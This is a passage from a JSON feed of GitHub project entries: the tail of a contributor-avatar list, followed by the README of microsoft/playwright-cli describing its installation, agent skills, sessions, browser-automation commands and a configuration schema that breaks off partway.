/></a> <a href=\"https://github.com/jogi47\"><img alt=\"jogi47\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1710139?v=4&amp;s=48\" title=\"jogi47\" width=\"48\" /></a> <a href=\"https://github.com/kentaro\"><img alt=\"kentaro\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/3458?v=4&amp;s=48\" title=\"kentaro\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Kevin%20Lin\"><img alt=\"Kevin Lin\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Kevin Lin\" width=\"48\" /></a> <a href=\"https://github.com/kira-ariaki\"><img alt=\"kira-ariaki\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/257352493?v=4&amp;s=48\" title=\"kira-ariaki\" width=\"48\" /></a> <a href=\"https://github.com/kitze\"><img alt=\"kitze\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1160594?v=4&amp;s=48\" title=\"kitze\" width=\"48\" /></a> <a href=\"https://github.com/Kiwitwitter\"><img alt=\"Kiwitwitter\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/25277769?v=4&amp;s=48\" title=\"Kiwitwitter\" width=\"48\" /></a> <a href=\"https://github.com/levifig\"><img alt=\"levifig\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1605?v=4&amp;s=48\" title=\"levifig\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Lloyd\"><img alt=\"Lloyd\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Lloyd\" width=\"48\" /></a> <a href=\"https://github.com/loganaden\"><img alt=\"loganaden\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1688420?v=4&amp;s=48\" title=\"loganaden\" width=\"48\" /></a> <a href=\"https://github.com/longjos\"><img alt=\"longjos\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/740160?v=4&amp;s=48\" title=\"longjos\" width=\"48\" /></a> <a href=\"https://github.com/loukotal\"><img alt=\"loukotal\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/18210858?v=4&amp;s=48\" title=\"loukotal\" width=\"48\" /></a> <a href=\"https://github.com/louzhixian\"><img alt=\"louzhixian\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/7994361?v=4&amp;s=48\" title=\"louzhixian\" width=\"48\" /></a> <a href=\"https://github.com/search?q=mac%20mimi\"><img alt=\"mac mimi\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"mac mimi\" width=\"48\" /></a> <a href=\"https://github.com/martinpucik\"><img alt=\"martinpucik\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/5503097?v=4&amp;s=48\" title=\"martinpucik\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Matt%20mini\"><img alt=\"Matt mini\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Matt mini\" width=\"48\" /></a> <a href=\"https://github.com/mcaxtr\"><img alt=\"mcaxtr\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/7562095?v=4&amp;s=48\" title=\"mcaxtr\" width=\"48\" /></a> <a href=\"https://github.com/mertcicekci0\"><img alt=\"mertcicekci0\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/179321902?v=4&amp;s=48\" title=\"mertcicekci0\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Miles\"><img alt=\"Miles\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Miles\" width=\"48\" /></a> <a href=\"https://github.com/mrdbstn\"><img alt=\"mrdbstn\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/58957632?v=4&amp;s=48\" title=\"mrdbstn\" width=\"48\" /></a> <a href=\"https://github.com/MSch\"><img alt=\"MSch\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/7475?v=4&amp;s=48\" title=\"MSch\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Mustafa%20Tag%20Eldeen\"><img alt=\"Mustafa Tag Eldeen\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Mustafa Tag Eldeen\" width=\"48\" /></a> <a href=\"https://github.com/mylukin\"><img alt=\"mylukin\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1021019?v=4&amp;s=48\" title=\"mylukin\" width=\"48\" /></a> <a href=\"https://github.com/nathanbosse\"><img alt=\"nathanbosse\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/4040669?v=4&amp;s=48\" title=\"nathanbosse\" width=\"48\" /></a> <a href=\"https://github.com/ndraiman\"><img alt=\"ndraiman\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/12609607?v=4&amp;s=48\" title=\"ndraiman\" width=\"48\" /></a> <a href=\"https://github.com/nexty5870\"><img alt=\"nexty5870\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/3869659?v=4&amp;s=48\" title=\"nexty5870\" width=\"48\" /></a> <a href=\"https://github.com/Noctivoro\"><img alt=\"Noctivoro\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/183974570?v=4&amp;s=48\" title=\"Noctivoro\" width=\"48\" /></a> <a href=\"https://github.com/Omar-Khaleel\"><img alt=\"Omar-Khaleel\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/240748662?v=4&amp;s=48\" title=\"Omar-Khaleel\" width=\"48\" /></a> <a href=\"https://github.com/ozgur-polat\"><img alt=\"ozgur-polat\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/26483942?v=4&amp;s=48\" title=\"ozgur-polat\" width=\"48\" /></a> <a href=\"https://github.com/ppamment\"><img alt=\"ppamment\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/2122919?v=4&amp;s=48\" title=\"ppamment\" width=\"48\" /></a> <a href=\"https://github.com/prathamdby\"><img alt=\"prathamdby\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/134331217?v=4&amp;s=48\" title=\"prathamdby\" width=\"48\" /></a> <a href=\"https://github.com/ptn1411\"><img alt=\"ptn1411\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/57529765?v=4&amp;s=48\" title=\"ptn1411\" width=\"48\" /></a> <a href=\"https://github.com/rafelbev\"><img alt=\"rafelbev\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/467120?v=4&amp;s=48\" title=\"rafelbev\" width=\"48\" /></a> <a href=\"https://github.com/reeltimeapps\"><img alt=\"reeltimeapps\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/637338?v=4&amp;s=48\" title=\"reeltimeapps\" width=\"48\" /></a> <a href=\"https://github.com/RLTCmpe\"><img alt=\"RLTCmpe\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/10762242?v=4&amp;s=48\" title=\"RLTCmpe\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Rony%20Kelner\"><img alt=\"Rony Kelner\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Rony Kelner\" width=\"48\" /></a> <a href=\"https://github.com/ryancnelson\"><img alt=\"ryancnelson\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/347171?v=4&amp;s=48\" title=\"ryancnelson\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Samrat%20Jha\"><img alt=\"Samrat Jha\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Samrat Jha\" width=\"48\" /></a> <a href=\"https://github.com/senoldogann\"><img alt=\"senoldogann\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/45736551?v=4&amp;s=48\" title=\"senoldogann\" width=\"48\" /></a> <a href=\"https://github.com/Seredeep\"><img alt=\"Seredeep\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/22802816?v=4&amp;s=48\" title=\"Seredeep\" width=\"48\" /></a> <a href=\"https://github.com/sergical\"><img alt=\"sergical\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/3760543?v=4&amp;s=48\" title=\"sergical\" width=\"48\" /></a> <a href=\"https://github.com/shiv19\"><img alt=\"shiv19\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/9407019?v=4&amp;s=48\" title=\"shiv19\" width=\"48\" /></a> <a href=\"https://github.com/shiyuanhai\"><img alt=\"shiyuanhai\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1187370?v=4&amp;s=48\" title=\"shiyuanhai\" width=\"48\" /></a> <a href=\"https://github.com/Shrinija17\"><img alt=\"Shrinija17\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/199155426?v=4&amp;s=48\" title=\"Shrinija17\" width=\"48\" /></a> <a href=\"https://github.com/siraht\"><img alt=\"siraht\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/73152895?v=4&amp;s=48\" title=\"siraht\" width=\"48\" /></a> <a href=\"https://github.com/snopoke\"><img alt=\"snopoke\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/249606?v=4&amp;s=48\" title=\"snopoke\" width=\"48\" /></a> <a href=\"https://github.com/stephenchen2025\"><img alt=\"stephenchen2025\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/218387130?v=4&amp;s=48\" title=\"stephenchen2025\" width=\"48\" /></a> <a href=\"https://github.com/search?q=techboss\"><img alt=\"techboss\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"techboss\" width=\"48\" /></a> <a href=\"https://github.com/testingabc321\"><img alt=\"testingabc321\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/8577388?v=4&amp;s=48\" title=\"testingabc321\" width=\"48\" /></a> <a href=\"https://github.com/search?q=The%20Admiral\"><img alt=\"The Admiral\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"The Admiral\" width=\"48\" /></a> <a href=\"https://github.com/thesash\"><img alt=\"thesash\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1166151?v=4&amp;s=48\" title=\"thesash\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Vibe%20Kanban\"><img alt=\"Vibe Kanban\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Vibe Kanban\" width=\"48\" /></a> <a href=\"https://github.com/vincentkoc\"><img alt=\"vincentkoc\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/25068?v=4&amp;s=48\" title=\"vincentkoc\" width=\"48\" /></a> <a href=\"https://github.com/voidserf\"><img alt=\"voidserf\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/477673?v=4&amp;s=48\" title=\"voidserf\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Vultr-Clawd%20Admin\"><img alt=\"Vultr-Clawd Admin\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Vultr-Clawd Admin\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Wimmie\"><img alt=\"Wimmie\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Wimmie\" width=\"48\" /></a> <a href=\"https://github.com/search?q=wolfred\"><img alt=\"wolfred\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"wolfred\" width=\"48\" /></a> <a href=\"https://github.com/wstock\"><img alt=\"wstock\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1394687?v=4&amp;s=48\" title=\"wstock\" width=\"48\" /></a> <a href=\"https://github.com/wytheme\"><img alt=\"wytheme\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/5009358?v=4&amp;s=48\" title=\"wytheme\" width=\"48\" /></a> <a href=\"https://github.com/YangHuang2280\"><img alt=\"YangHuang2280\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/201681634?v=4&amp;s=48\" title=\"YangHuang2280\" width=\"48\" /></a> <a href=\"https://github.com/yazinsai\"><img alt=\"yazinsai\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1846034?v=4&amp;s=48\" title=\"yazinsai\" width=\"48\" /></a> <a href=\"https://github.com/yevhen\"><img alt=\"yevhen\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/107726?v=4&amp;s=48\" title=\"yevhen\" width=\"48\" /></a> <a href=\"https://github.com/YiWang24\"><img alt=\"YiWang24\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/176262341?v=4&amp;s=48\" title=\"YiWang24\" width=\"48\" /></a> <a href=\"https://github.com/search?q=ymat19\"><img alt=\"ymat19\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"ymat19\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Zach%20Knickerbocker\"><img alt=\"Zach Knickerbocker\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Zach Knickerbocker\" width=\"48\" /></a> <a href=\"https://github.com/zackerthescar\"><img alt=\"zackerthescar\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/38077284?v=4&amp;s=48\" title=\"zackerthescar\" width=\"48\" /></a> <a href=\"https://github.com/0xJonHoldsCrypto\"><img alt=\"0xJonHoldsCrypto\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/81202085?v=4&amp;s=48\" title=\"0xJonHoldsCrypto\" width=\"48\" /></a> <a href=\"https://github.com/aaronn\"><img alt=\"aaronn\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/1653630?v=4&amp;s=48\" title=\"aaronn\" width=\"48\" /></a> <a href=\"https://github.com/Alphonse-arianee\"><img alt=\"Alphonse-arianee\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/254457365?v=4&amp;s=48\" title=\"Alphonse-arianee\" width=\"48\" /></a> <a href=\"https://github.com/atalovesyou\"><img alt=\"atalovesyou\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/3534502?v=4&amp;s=48\" title=\"atalovesyou\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Azade\"><img alt=\"Azade\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Azade\" width=\"48\" /></a> <a href=\"https://github.com/carlulsoe\"><img alt=\"carlulsoe\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/34673973?v=4&amp;s=48\" title=\"carlulsoe\" width=\"48\" /></a> <a href=\"https://github.com/search?q=ddyo\"><img alt=\"ddyo\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"ddyo\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Erik\"><img alt=\"Erik\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Erik\" width=\"48\" /></a> <a href=\"https://github.com/jiulingyun\"><img alt=\"jiulingyun\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/126459548?v=4&amp;s=48\" title=\"jiulingyun\" width=\"48\" /></a> <a href=\"https://github.com/latitudeki5223\"><img alt=\"latitudeki5223\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/119656367?v=4&amp;s=48\" title=\"latitudeki5223\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Manuel%20Maly\"><img alt=\"Manuel Maly\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Manuel Maly\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Mourad%20Boustani\"><img alt=\"Mourad Boustani\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Mourad Boustani\" width=\"48\" /></a> <a href=\"https://github.com/odrobnik\"><img alt=\"odrobnik\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/333270?v=4&amp;s=48\" title=\"odrobnik\" width=\"48\" /></a> <a href=\"https://github.com/pcty-nextgen-ios-builder\"><img alt=\"pcty-nextgen-ios-builder\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"pcty-nextgen-ios-builder\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Quentin\"><img alt=\"Quentin\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Quentin\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Randy%20Torres\"><img alt=\"Randy Torres\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Randy Torres\" width=\"48\" /></a> <a href=\"https://github.com/rhjoh\"><img alt=\"rhjoh\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/105699450?v=4&amp;s=48\" title=\"rhjoh\" width=\"48\" /></a> <a href=\"https://github.com/search?q=Rolf%20Fredheim\"><img alt=\"Rolf Fredheim\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"Rolf Fredheim\" width=\"48\" /></a> <a href=\"https://github.com/ronak-guliani\"><img alt=\"ronak-guliani\" height=\"48\" src=\"https://avatars.githubusercontent.com/u/23518228?v=4&amp;s=48\" title=\"ronak-guliani\" width=\"48\" /></a> <a href=\"https://github.com/search?q=William%20Stock\"><img alt=\"William Stock\" height=\"48\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/assets/avatar-placeholder.svg?sanitize=true\" title=\"William Stock\" width=\"48\" /></a> </p>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:03.745524Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 13,
        "timeliness_score": 1,
        "final_score": 4.6,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/microsoft/playwright-cli",
        "title": "microsoft/playwright-cli",
        "summary": "<p>CLI for common Playwright actions. Record and generate Playwright code, inspect selectors and take screenshots.</p><hr /><h1>playwright-cli</h1> \n<p>Playwright CLI with SKILLS</p> \n<h3>Playwright CLI vs Playwright MCP</h3> \n<p>This package provides CLI interface into Playwright. If you are using <strong>coding agents</strong>, that is the best fit.</p> \n<ul> \n <li> <p><strong>CLI</strong>: Modern <strong>coding agents</strong> increasingly favor CLI–based workflows exposed as SKILLs over MCP because CLI invocations are more token-efficient: they avoid loading large tool schemas and verbose accessibility trees into the model context, allowing agents to act through concise, purpose-built commands. This makes CLI + SKILLs better suited for high-throughput coding agents that must balance browser automation with large codebases, tests, and reasoning within limited context windows.</p> </li> \n <li> <p><strong>MCP</strong>: MCP remains relevant for specialized agentic loops that benefit from persistent state, rich introspection, and iterative reasoning over page structure, such as exploratory automation, self-healing tests, or long-running autonomous workflows where maintaining continuous browser context outweighs token cost concerns. Learn more about <a href=\"https://github.com/microsoft/playwright-mcp\">Playwright MCP</a>.</p> </li> \n</ul> \n<h3>Key Features</h3> \n<ul> \n <li><strong>Token-efficient</strong>. Does not force page data into LLM.</li> \n</ul> \n<h3>Requirements</h3> \n<ul> \n <li>Node.js 18 or newer</li> \n <li>Claude Code, GitHub Copilot, or any other coding agent.</li> \n</ul> \n<h2>Getting Started</h2> \n<h2>Installation</h2> \n<pre><code class=\"language-bash\">npm install -g @playwright/cli@latest\nplaywright-cli --help\n</code></pre> \n<h3>Installing skills</h3> \n<p>Claude Code, GitHub Copilot and others will use the locally installed skills.</p> \n<pre><code class=\"language-bash\">playwright-cli install --skills\n</code></pre> \n<h3>Skills-less operation</h3> \n<p>Point your agent at the CLI and let it cook. It'll read the skill off <code>playwright-cli --help</code> on its own:</p> \n<pre><code>Test the \"add todo\" flow on https://demo.playwright.dev/todomvc using playwright-cli.\nCheck playwright-cli --help for available commands.\n</code></pre> \n<h2>Demo</h2> \n<pre><code>&gt; Use playwright skills to test https://demo.playwright.dev/todomvc/.\n  Take screenshots for all successful and failing scenarios. \n</code></pre> \n<p>Your agent will be running commands, but it does not mean you can't play with it manually:</p> \n<pre><code>playwright-cli open https://demo.playwright.dev/todomvc/ --headed\nplaywright-cli type \"Buy groceries\"\nplaywright-cli press Enter\nplaywright-cli type \"Water flowers\"\nplaywright-cli press Enter\nplaywright-cli check e21\nplaywright-cli check e35\nplaywright-cli screenshot\n</code></pre> \n<h2>Headed operation</h2> \n<p>Playwright CLI is headless by default. If you'd like to see the browser, pass <code>--headed</code> to <code>open</code>:</p> \n<pre><code class=\"language-bash\">playwright-cli open https://playwright.dev --headed\n</code></pre> \n<h2>Sessions</h2> \n<p>Playwright CLI will use a dedicated persistent profile by default. It means that your cookies and other storage state will be preserved between the calls. You can use different instances of the browser for different projects with sessions.</p> \n<p>Following will result in two browsers with separate profiles being available. Pass <code>-s=</code> to the invocation to talk to a specific browser.</p> \n<pre><code class=\"language-bash\">playwright-cli open https://playwright.dev\nplaywright-cli -s=example open https://example.com\nplaywright-cli list\n</code></pre> \n<p>You can run your coding agent with the <code>PLAYWRIGHT_CLI_SESSION</code> environment variable:</p> \n<pre><code class=\"language-bash\">PLAYWRIGHT_CLI_SESSION=todo-app claude .\n</code></pre> \n<p>Or instruct it to prepend <code>-s=</code> to the calls.</p> \n<p>Manage your sessions as follows:</p> \n<pre><code class=\"language-bash\">playwright-cli list                     # list all sessions\nplaywright-cli close-all                # close all browsers\nplaywright-cli kill-all                 # forcefully kill all browser processes\n</code></pre> \n<!-- BEGIN GENERATED CLI HELP --> \n<h2>Commands</h2> \n<h3>Core</h3> \n<pre><code class=\"language-bash\">playwright-cli open [url]               # open browser, optionally navigate to url\nplaywright-cli goto &lt;url&gt;               # navigate to a url\nplaywright-cli close                    # close the page\nplaywright-cli type &lt;text&gt;              # type text into editable element\nplaywright-cli click &lt;ref&gt; [button]     # perform click on a web page\nplaywright-cli dblclick &lt;ref&gt; [button]  # perform double click on a web page\nplaywright-cli fill &lt;ref&gt; &lt;text&gt;        # fill text into editable element\nplaywright-cli drag &lt;startRef&gt; &lt;endRef&gt; # perform drag and drop between two elements\nplaywright-cli hover &lt;ref&gt;              # hover over element on page\nplaywright-cli select &lt;ref&gt; &lt;val&gt;       # select an option in a dropdown\nplaywright-cli upload &lt;file&gt;            # upload one or multiple files\nplaywright-cli check &lt;ref&gt;              # check a checkbox or radio button\nplaywright-cli uncheck &lt;ref&gt;            # uncheck a checkbox or radio button\nplaywright-cli snapshot                 # capture page snapshot to obtain element ref\nplaywright-cli snapshot --filename=f    # save snapshot to specific file\nplaywright-cli eval &lt;func&gt; [ref]        # evaluate javascript expression on page or element\nplaywright-cli dialog-accept [prompt]   # accept a dialog\nplaywright-cli dialog-dismiss           # dismiss a dialog\nplaywright-cli resize &lt;w&gt; &lt;h&gt;           # resize the browser window\n</code></pre> \n<h3>Navigation</h3> \n<pre><code class=\"language-bash\">playwright-cli go-back                  # go back to the previous page\nplaywright-cli go-forward               # go forward to the next page\nplaywright-cli reload                   # reload the current page\n</code></pre> \n<h3>Keyboard</h3> \n<pre><code class=\"language-bash\">playwright-cli press &lt;key&gt;              # press a key on the keyboard, `a`, `arrowleft`\nplaywright-cli keydown &lt;key&gt;            # press a key down on the keyboard\nplaywright-cli keyup &lt;key&gt;              # press a key up on the keyboard\n</code></pre> \n<h3>Mouse</h3> \n<pre><code class=\"language-bash\">playwright-cli mousemove &lt;x&gt; &lt;y&gt;        # move mouse to a given position\nplaywright-cli mousedown [button]       # press mouse down\nplaywright-cli mouseup [button]         # press mouse up\nplaywright-cli mousewheel &lt;dx&gt; &lt;dy&gt;     # scroll mouse wheel\n</code></pre> \n<h3>Save as</h3> \n<pre><code class=\"language-bash\">playwright-cli screenshot [ref]         # screenshot of the current page or element\nplaywright-cli screenshot --filename=f  # save screenshot with specific filename\nplaywright-cli pdf                      # save page as pdf\nplaywright-cli pdf --filename=page.pdf  # save pdf with specific filename\n</code></pre> \n<h3>Tabs</h3> \n<pre><code class=\"language-bash\">playwright-cli tab-list                 # list all tabs\nplaywright-cli tab-new [url]            # create a new tab\nplaywright-cli tab-close [index]        # close a browser tab\nplaywright-cli tab-select &lt;index&gt;       # select a browser tab\n</code></pre> \n<h3>Storage</h3> \n<pre><code class=\"language-bash\">playwright-cli state-save [filename]    # save storage state\nplaywright-cli state-load &lt;filename&gt;    # load storage state\n\n# Cookies\nplaywright-cli cookie-list [--domain]   # list cookies\nplaywright-cli cookie-get &lt;name&gt;        # get a cookie\nplaywright-cli cookie-set &lt;name&gt; &lt;val&gt;  # set a cookie\nplaywright-cli cookie-delete &lt;name&gt;     # delete a cookie\nplaywright-cli cookie-clear             # clear all cookies\n\n# LocalStorage\nplaywright-cli localstorage-list        # list localStorage entries\nplaywright-cli localstorage-get &lt;key&gt;   # get localStorage value\nplaywright-cli localstorage-set &lt;k&gt; &lt;v&gt; # set localStorage value\nplaywright-cli localstorage-delete &lt;k&gt;  # delete localStorage entry\nplaywright-cli localstorage-clear       # clear all localStorage\n\n# SessionStorage\nplaywright-cli sessionstorage-list      # list sessionStorage entries\nplaywright-cli sessionstorage-get &lt;k&gt;   # get sessionStorage value\nplaywright-cli sessionstorage-set &lt;k&gt; &lt;v&gt; # set sessionStorage value\nplaywright-cli sessionstorage-delete &lt;k&gt;  # delete sessionStorage entry\nplaywright-cli sessionstorage-clear     # clear all sessionStorage\n</code></pre> \n<h3>Network</h3> \n<pre><code class=\"language-bash\">playwright-cli route &lt;pattern&gt; [opts]   # mock network requests\nplaywright-cli route-list               # list active routes\nplaywright-cli unroute [pattern]        # remove route(s)\n</code></pre> \n<h3>DevTools</h3> \n<pre><code class=\"language-bash\">playwright-cli console [min-level]      # list console messages\nplaywright-cli network                  # list all network requests since loading the page\nplaywright-cli run-code &lt;code&gt;          # run playwright code snippet\nplaywright-cli tracing-start            # start trace recording\nplaywright-cli tracing-stop             # stop trace recording\nplaywright-cli video-start              # start video recording\nplaywright-cli video-stop [filename]    # stop video recording\n</code></pre> \n<h3>Install</h3> \n<pre><code class=\"language-bash\">playwright-cli install --skills         # install skills\nplaywright-cli install-browser          # install browser\n</code></pre> \n<h3>Configuration</h3> \n<pre><code class=\"language-bash\">playwright-cli config [options]         # configure session settings\nplaywright-cli open --browser=chrome    # use specific browser\nplaywright-cli open --extension         # connect via browser extension\nplaywright-cli open --persistent        # use persistent profile\nplaywright-cli open --profile=&lt;path&gt;    # use custom profile directory\nplaywright-cli open --config=file.json  # use config file\nplaywright-cli close                    # close the browser\nplaywright-cli delete-data              # delete user data for default session\n</code></pre> \n<h3>Sessions</h3> \n<pre><code class=\"language-bash\">playwright-cli -s=name &lt;cmd&gt;            # run command in named session\nplaywright-cli -s=name close            # stop a named browser\nplaywright-cli -s=name delete-data      # delete user data for named browser\nplaywright-cli list                     # list all sessions\nplaywright-cli close-all                # close all browsers\nplaywright-cli kill-all                 # forcefully kill all browser processes\n</code></pre> \n<!-- END GENERATED CLI HELP --> \n<h2>Configuration file</h2> \n<p>The Playwright CLI can be configured using a JSON configuration file. You can specify the configuration file using the <code>--config</code> command line option:</p> \n<pre><code class=\"language-bash\">playwright-cli --config path/to/config.json open example.com\n</code></pre> \n<p>Playwright CLI will load config from <code>playwright-cli.json</code> by default so that you did not need to specify it every time.</p> \n<details> \n Configuration file schema \n <pre><code class=\"language-typescript\">{\n  /**\n   * The browser to use.\n   */\n  browser?: {\n    /**\n     * The type of browser to use.\n     */\n    browserName?: 'chromium' | 'firefox' | 'webkit';\n\n    /**\n     * Keep the browser profile in memory, do not save it to disk.\n     */\n    isolated?: boolean;\n\n    /**\n     * Path to a user data directory for browser profile persistence.\n     * Temporary directory is created by default.\n     */\n    userDataDir?: string;\n\n    /**\n     * Launch options passed to\n     * @see https://playwright.dev/docs/api/class-browsertype#browser-type-launch-persistent-context\n     *\n     * This is useful for settings options like `channel`, `headless`, `executablePath`, etc.\n     */\n    launchOptions?: playwright.LaunchOptions;\n\n    /**\n     * Context options for the browser context.\n     *\n     * This is useful for settings options like `viewport`.\n     */\n    contextOptions?: playwright.BrowserContextOptions;\n\n    /**\n     * Chrome DevTools Protocol endpoint to connect to an existing browser instance in case of Chromium family browsers.\n     */\n    cdpEndpoint?: string;\n\n    /**\n     * CDP headers to send with the connect request.\n     */\n    cdpHeaders?: Record&lt;string, string&gt;;\n\n    /**\n     * Timeout in milliseconds for connecting to CDP endpoint. Defaults to 30000 (30 seconds). Pass 0 to disable timeout.\n     */\n    cdpTimeout?: number;\n\n    /**\n     * Remote endpoint to connect to an existing Playwright server.\n     */\n    remoteEndpoint?: string;\n\n    /**\n     * Paths to TypeScript files to add as initialization scripts for Playwright page.\n     */\n    initPage?: string[];\n\n    /**\n     * Paths to JavaScript files to add as initialization scripts.\n     * The scripts will be evaluated in every page before any of the page's scripts.\n     */\n    initScript?: string[];\n  },\n\n  /**\n   * If specified, saves the Playwright video of the session into the output directory.\n   */\n  saveVideo?: {\n    width: number;\n    height: number;\n  };\n\n  /**\n   * The directory to save output files.\n   */\n  outputDir?: string;\n\n  /**\n   * Whether to save snapshots, console messages, network logs and other session logs to a file or to the standard output. Defaults to \"stdout\".\n   */\n  outputMode?: 'file' | 